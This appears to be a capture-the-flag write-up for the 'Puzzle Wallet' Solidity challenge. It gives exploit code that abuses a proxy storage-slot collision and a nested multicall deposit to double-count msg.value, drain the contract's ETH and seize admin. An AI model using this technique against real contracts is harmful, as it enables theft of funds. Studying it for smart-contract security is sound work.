# Puzzle Wallet

One of the hardest solidity challenges yet. Here is the overview

---

It has misaligned state variables in the two contracts. So to edit the `admin` variable we can edit the `maxBalance`.

```solidity
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;
```

```solidity
contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
```

To update the `maxBalance` we need to be on the `onlyWhiteListed`

```solidity
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }
```

For us to get in the whitelist we can `proposeNewAdmin` to us (`address(this)`) and then `addToWhitelist` to set us there.

---
 
In the `setMaxBalance` there is a `require` that checks that the balance of the contract is set to 0. When the challenge is deployed it has 0.001 ETH in it. Do "steal" this and remove it we can use the advanced function `multicall`, to deposit and withdraw and set it to 0. 

This is done with: 
```solidity
bytes[] memory deposit_data = new bytes[](1);
deposit_data[0] = abi.encodeWithSelector(wallet.deposit.selector);

bytes[] memory data = new bytes[](2);
// Depositing
data[0] = deposit_data[0];
// multicall -> deposit
data[1] = abi.encodeWithSelector(wallet.multicall.selector, deposit_data);
wallet.multicall{value: 0.001 ether}(data);

// Withdraw money
wallet.execute(msg.sender, 0.002 ether, "");
```

Then we can call `setMaxBalance` to us with casting the address -> `uint256(uint160(msg.sender))`